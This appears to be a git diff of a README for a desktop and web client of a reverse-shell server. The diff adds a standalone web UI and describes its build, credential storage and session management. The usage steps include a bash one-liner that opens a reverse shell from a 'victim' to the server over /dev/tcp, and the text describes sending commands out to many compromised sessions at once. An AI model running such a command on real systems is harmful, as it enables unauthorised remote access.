@@ -1,26 +1,31 @@
-# Platypus Desktop
+# Platypus Desktop + standalone Web UI
 
-Native (Wails v2) desktop client for [platypus-server](../). Operators install
-this on their laptop, point it at any reachable server URL + secret, and get
-a tabbed UI for sessions, terminals, file transfer, port forwarding, and
-plain→encrypted upgrade.
+Two UI flavours share this React codebase:
 
-The server stays a pure REST + WebSocket API — there is no embedded UI in
-`platypus-server` anymore. Multiple desktops can connect to the same server.
+- **Desktop** (Wails v2) — native window, OS-keychain-backed credentials,
+  `desktop/build/bin/<name>` after `make desktop-build`. Install once, use
+  anywhere.
+- **Standalone web UI** — same pages, built into a static bundle
+  (`desktop/frontend/dist-web/`) you can host anywhere. Useful for quick
+  feature verification without installing the native app, or for remoting
+  into a headless ops box.
+
+Both point at the same `platypus-server` REST+WS API; the server ships no
+embedded UI and doesn't know about either frontend.
 
 ## Architecture
 
 | Layer | Tech | Notes |
 |---|---|---|
-| Shell | Wails v2 | Native window via webkit2gtk / WebView2 / WKWebView |
+| Shell | Wails v2 / browser | Native WKWebView/webkit2gtk/WebView2 or any browser |
 | UI | React 18 + Vite + TypeScript + antd 6 + xterm.js | |
-| Glue | Wails JS↔Go bindings | Auto-generated under `frontend/wailsjs/` |
-| Logic | Go (this module) | All HTTP, WebSocket, keychain, file IO |
+| Glue (desktop) | Wails JS↔Go bindings | Auto-generated under `frontend/wailsjs/`; Go owns HTTP/WS/keychain/file IO |
+| Glue (web) | `frontend/src/platform/*.web.ts` | Drop-in shim — same names as the Wails bindings, backed by `fetch` + browser WebSocket. Credentials cached in `localStorage`. |
 
-The frontend never touches the network or the keychain directly — every
-external interaction goes through `App.*` methods on the Go side. This keeps
-secrets out of the WebView and lets us write proper Go tests against
-`httptest.Server` for the entire API surface.
+Vite picks the glue at build time: default mode → Wails bindings, `--mode web`
+aliases the three wailsjs imports (`go/app/App`, `runtime/runtime`, `go/models`)
+to the shims under `src/platform/`. Every page under `src/pages/` is shared
+verbatim across both modes.
 
 ## Layout
 
@@ -50,11 +55,25 @@ desktop/
 
 ## Develop
 
+Desktop (Wails):
+
 ```bash
 make desktop-deps         # one-time: install Wails CLI + npm packages
 make desktop-bindings     # any time you add/remove App methods on the Go side
 make desktop-dev          # hot-reload dev mode
 ```
+
+Web UI:
+
+```bash
+make web-ui               # builds desktop/frontend/dist-web/
+make web-ui-serve         # serves dist-web/ at http://localhost:8080
+```
+
+Any static host works — GitHub Pages, Netlify, S3, nginx. CORS on
+platypus-server is `*`, so cross-origin fetch + WebSocket work out of the
+box. Only requirement: UI and server must share URL scheme (both HTTP
+locally, both HTTPS in prod).
 
 On Linux, install the WebKit/GTK dev libs first:
 
@@ -92,23 +111,24 @@ documented at https://wails.io/docs/reference/cli.
 
 1. Run the server and note the secret printed at startup
    (`./build/platypus-server` → "API secret: …").
-2. Launch the desktop app.
-3. **Add Profile**: name = "local", URL = `http://127.0.0.1:7331`, paste the
-   secret. Save.
-4. **Connect**. The app exchanges the secret for a Bearer token and switches
-   to the Sessions tab.
-5. Trigger a reverse shell on a victim:
+2. Pick a client:
+   - **Desktop**: launch the native app, click **Add Profile**, paste
+     URL + secret, **Connect**. Secrets live in the OS keychain (Keychain
+     on macOS, Credential Vault on Windows, Secret Service on Linux).
+   - **Web UI**: open `http://localhost:8080` (from `make web-ui-serve`),
+     paste URL + secret, **Connect**. URL + bearer token cache to
+     `localStorage`; Disconnect clears both.
+3. Trigger a reverse shell on a victim:
    `bash -c 'bash -i >/dev/tcp/<server>/13337 0>&1'`
-6. The session appears in the Sessions tab; click **Open Terminal** to
-   interact, **Upgrade** to convert to encrypted, etc.
-
-Secrets live in the OS keychain (Keychain on macOS, Credential Vault on
-Windows, Secret Service on Linux). On headless Linux without
-`secret-service`, profile creation will fail; we'll surface a clearer error
-and add a fallback in a future iteration.
+4. The session appears in the Sessions tab; click **Open Terminal** to
+   interact, **Upgrade** to convert to encrypted, **Group**+**Dispatch
+   Command** to fan out a shell command to multiple sessions.
 
 ## Out of MVP scope
 
+- Real-time `/notify` push events in the web UI (new-session toast, upgrade
+  progress bar). Desktop has this via Wails events; web mode currently
+  relies on a Refresh button.
 - Directory listing in the file browser (server only exposes read/write/size).
 - WebGL renderer for xterm (Wails WebView compatibility varies across
   platforms — using Canvas).
